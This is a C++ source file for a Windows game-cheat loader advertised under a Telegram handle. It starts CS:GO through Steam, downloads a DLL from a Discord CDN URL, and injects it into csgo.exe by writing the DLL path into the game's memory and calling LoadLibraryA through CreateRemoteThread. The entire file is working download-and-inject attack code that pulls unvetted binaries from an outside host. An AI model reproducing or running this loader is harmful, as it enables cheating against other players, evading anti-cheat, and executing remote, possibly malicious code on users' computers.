// jebac dawisia 123
#include <iostream>
#include <windows.h>
#include <TlHelp32.h>
#include <fstream>
#include <string>
#include <tchar.h>
#pragma once
#define __CONSTANTS_H 1

using namespace std;
#pragma comment(lib, "urlmon.lib")
char input;


DWORD GetProcID(const char* procName)

{
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 procEntry;
        procEntry.dwSize = sizeof(procEntry);

        if (Process32First(hSnap, &procEntry))
        {
            do
            {
                if (!_stricmp(procEntry.szExeFile, procName))
                {
                    procId = procEntry.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnap, &procEntry));
        }
    }
    CloseHandle(hSnap);
    return procId;
}




int main()
{
    SetConsoleTitleW(L"t.me/sticzus1337");
    std::cout << "[ t.me/sticzus1337 ] welcome..\n";
    Sleep(2000);
    std::cout << "\n";
    std::cout << "[ t.me/sticzus1337 ] select cheat..\n";
    std::cout << "\n";
    std::cout << "\n[1] pandora.gg \n";

    std::cin >> input;


    if (input == '1')
    {

        ShellExecute(NULL, "open", "steam://rungameid/730", NULL, NULL, SW_SHOWDEFAULT);

        std::cout << "\n[ t.me/sticzus1337 ] injecting...\n";
        std::cout << "\n";

        Sleep(3000);


        string dwnld_URL = "https://cdn.discordapp.com/attachments/1155941262151667792/1156121299551256576/pandora_desync.dll";
        string savepath = "C:\\tmp\\pandora_desync.dll";
        URLDownloadToFileA(NULL, dwnld_URL.c_str(), savepath.c_str(), 0, NULL);
        WORD GetProcId(const char* procName);
        // steam
        const char* dllPath = "C:\\tmp\\pandora_desync.dll";
        const char* procName = "csgo.exe";
        DWORD procId = 0;

        while (!procId)
        {
            procId = GetProcID(procName);
            Sleep(30);
        }
        HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);

        if (hProc && hProc != INVALID_HANDLE_VALUE)
        {
            void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);

            HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);

            if (hThread)
            {
                CloseHandle(hThread);
            }
        }

        if (hProc)
        {
            CloseHandle(hProc);
        }
        std::cout << "\n[ t.me/sticzus1337 ] injected!\n";
        Sleep(9000);
        // csgo
    }
}